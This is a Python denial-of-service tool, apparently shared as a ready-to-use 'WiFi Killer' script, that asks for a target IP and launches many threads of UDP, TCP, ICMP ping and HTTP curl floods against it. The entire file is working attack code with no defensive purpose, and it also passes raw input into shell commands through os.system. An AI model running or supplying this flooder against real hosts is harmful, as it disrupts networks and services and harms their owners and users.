#!/usr/bin/env python3
import os
import time
import random
import socket
import threading
import subprocess

print("""
╔═══════════════════════════════════════════╗
║    WiFi Killer ULTRA SIMPLE v7.0          ║
║    Made by @Barxzzz                       ║
║    "100% Work - Guaranteed No Error"      ║
╚═══════════════════════════════════════════╝
""")

# ===== INPUT =====
target_ip = input("[?] Target IP: ")
threads = int(input("[?] Threads (50-200): "))
duration = int(input("[?] Durasi (detik): "))

# ===== UDP FLOOD (Paling Brutal) =====
def udp_flood(ip, dur):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + dur
    while time.time() < end:
        try:
            port = random.randint(1, 65535)
            sock.sendto(os.urandom(65500), (ip, port))
        except:
            pass

# ===== TCP FLOOD =====
def tcp_flood(ip, dur):
    end = time.time() + dur
    while time.time() < end:
        try:
            port = random.randint(1, 65535)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((ip, port))
            s.send(os.urandom(4096))
            s.close()
        except:
            pass

# ===== ICMP FLOOD (Ping) =====
def icmp_flood(ip, dur):
    end = time.time() + dur
    while time.time() < end:
        os.system(f"ping -s 65500 -c 1 {ip} > /dev/null 2>&1")

# ===== HTTP FLOOD (Curl) =====
def http_flood(ip, dur):
    end = time.time() + dur
    while time.time() < end:
        os.system(f"curl -s -o /dev/null http://{ip} &")
        os.system(f"curl -s -o /dev/null https://{ip} &")

# ===== MULAI SERANGAN =====
print(f"\n[⚡] Attacking {target_ip} with {threads} threads...")
print("[💀] Target will die in seconds!\n")

for i in range(threads):
    threading.Thread(target=udp_flood, args=(target_ip, duration), daemon=True).start()
    threading.Thread(target=tcp_flood, args=(target_ip, duration), daemon=True).start()
    threading.Thread(target=icmp_flood, args=(target_ip, duration), daemon=True).start()
    threading.Thread(target=http_flood, args=(target_ip, duration), daemon=True).start()

# Monitor bandwidth
start_time = time.time()
while time.time() - start_time < duration:
    time.sleep(1)
    print(f"[📊] Running... {int(duration - (time.time() - start_time))}s remaining", end="\r")

print("\n\n[✔] ATTACK COMPLETE! Target is down.")
